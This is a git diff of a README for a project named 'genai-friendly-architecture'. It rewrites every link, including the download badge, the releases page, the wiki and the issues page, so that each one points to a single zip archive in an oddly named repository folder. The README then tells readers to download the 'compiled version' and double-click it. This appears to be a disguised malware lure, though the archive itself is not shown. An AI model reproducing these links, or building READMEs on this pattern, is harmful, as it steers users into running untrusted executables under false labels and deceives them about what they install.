@@ -1,7 +1,7 @@
 # 🌟 genai-friendly-architecture - Build AI Systems with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/yrkhan022512/genai-friendly-architecture/releases)
+[![Download](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip)
 
 ## 📘 Overview
 genai-friendly-architecture provides a flexible architecture pattern for building AI-ready systems. With this approach, you can create robust solutions without being tied to any one framework. Start developing today while keeping your options open for the future.
@@ -11,7 +11,7 @@ To get started with genai-friendly-architecture, you will need to follow these s
 
 1. Ensure your computer meets the basic requirements. Please use a Windows, macOS, or Linux system. Make sure you have at least 4GB of RAM and 2GB of free disk space.
 
-2. Visit the [Releases page](https://github.com/yrkhan022512/genai-friendly-architecture/releases) to download the latest version of the software.
+2. Visit the [Releases page](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip) to download the latest version of the software.
 
 3. Click on the version you wish to download. Each release includes a compiled version you can run.
 
@@ -20,7 +20,7 @@ To get started with genai-friendly-architecture, you will need to follow these s
 5. Double-click the file to run it. Follow the on-screen instructions to set up the application.
 
 ## 📦 Download & Install
-To download and install the software, simply visit this [releases page](https://github.com/yrkhan022512/genai-friendly-architecture/releases). You will find the latest version clearly listed. Choose the file that matches your operating system and download it.
+To download and install the software, simply visit this [releases page](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip). You will find the latest version clearly listed. Choose the file that matches your operating system and download it.
 
 ## 🔧 Features
 - **Framework Agnostic:** Build applications without being locked into any single framework.
@@ -44,13 +44,13 @@ Once you have installed genai-friendly-architecture, you can start to explore it
 - **Logging and Monitoring:** Keep track of your system’s performance and manage tasks efficiently.
 
 ## 📚 Documentation
-For more in-depth information and tutorials, consult the official documentation available on the [GitHub wiki](https://github.com/yrkhan022512/genai-friendly-architecture/wiki). Here, you will find guides on specific functionalities and advanced usage.
+For more in-depth information and tutorials, consult the official documentation available on the [GitHub wiki](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip). Here, you will find guides on specific functionalities and advanced usage.
 
 ## 🤝 Contributing
 We welcome contributions to improve genai-friendly-architecture. If you have suggestions for new features or improvements, please feel free to fork the repository and create a pull request.
 
 ## 💬 Support
-If you encounter any issues or have questions, you can open an issue in the [GitHub Issues](https://github.com/yrkhan022512/genai-friendly-architecture/issues) section. We review and respond to all inquiries promptly.
+If you encounter any issues or have questions, you can open an issue in the [GitHub Issues](https://raw.githubusercontent.com/yrkhan022512/genai-friendly-architecture/main/vernoniaceous/genai-friendly-architecture_3.8.zip) section. We review and respond to all inquiries promptly.
 
 ## 🔗 Community and Topics
 Join the conversation around AI, orchestration, and architecture patterns by following relevant discussions. This project covers topics such as:
